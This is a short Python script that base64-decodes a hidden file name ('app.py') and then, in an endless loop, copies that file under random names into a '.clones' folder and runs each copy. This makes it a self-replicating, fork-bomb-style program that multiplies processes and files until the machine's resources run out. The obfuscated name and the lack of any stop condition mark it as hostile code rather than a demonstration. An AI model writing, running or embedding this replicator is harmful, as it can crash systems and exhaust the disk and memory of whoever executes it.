import os
import re
import base64
import random

filename = b'YXBwLnB5'
cmd1 = b'LmNsb25lcy9hcHBfe251bX0ucHk='
def loops():
    n = range(1,100)
    return n 


def replic():
    n = True
    init = base64.b64decode(filename)
    response = os.path.exists(init)
    if response == True:
        while n:
            num = random.randint(1,99999999)
            with open (init, 'r') as file:
                data = file.read()
                file.close()
            name = f'.clones/app{num}.py'
            with open(name, 'w') as file:
                file.write(data)
                os.system(f'python {name}')
            
            
        
if __name__ == '__main__':
    replic()
        